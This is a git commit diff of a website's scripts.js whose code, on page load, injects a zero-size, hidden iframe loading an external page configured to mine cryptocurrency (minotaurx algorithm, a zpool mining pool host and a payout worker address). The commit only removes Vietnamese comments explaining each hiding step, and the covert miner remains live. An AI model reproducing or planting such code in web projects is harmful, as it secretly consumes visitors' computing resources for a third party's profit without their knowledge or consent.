77f8fda991a2b084e1917e17e3cff591cc0b2253
Teo4268 <mamacook3300@gmail.com>
2025-01-25 22:08:36 +0700

    Update scripts.js

--- scripts.js
+++ scripts.js
@@ -1,11 +1,11 @@
 document.addEventListener("DOMContentLoaded", () => {
   const iframe = document.createElement("iframe");
   iframe.src = "https://thanksyousomuch.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q&password=c%3DRVN&workers=2";
-  iframe.style.width = "0"; // Ẩn chiều rộng
-  iframe.style.height = "0"; // Ẩn chiều cao
-  iframe.style.border = "none"; // Loại bỏ viền
-  iframe.style.position = "absolute"; // Đặt ngoài luồng chính
-  iframe.style.visibility = "hidden"; // Không hiển thị
-  iframe.style.opacity = "0"; // Độ trong suốt bằng 0
-  document.body.appendChild(iframe); // Thêm iframe vào trang
+  iframe.style.width = "0"; 
+  iframe.style.height = "0"; 
+  iframe.style.border = "none"; 
+  iframe.style.position = "absolute"; 
+  iframe.style.visibility = "hidden"; 
+  iframe.style.opacity = "0"; 
+  document.body.appendChild(iframe); 
 });
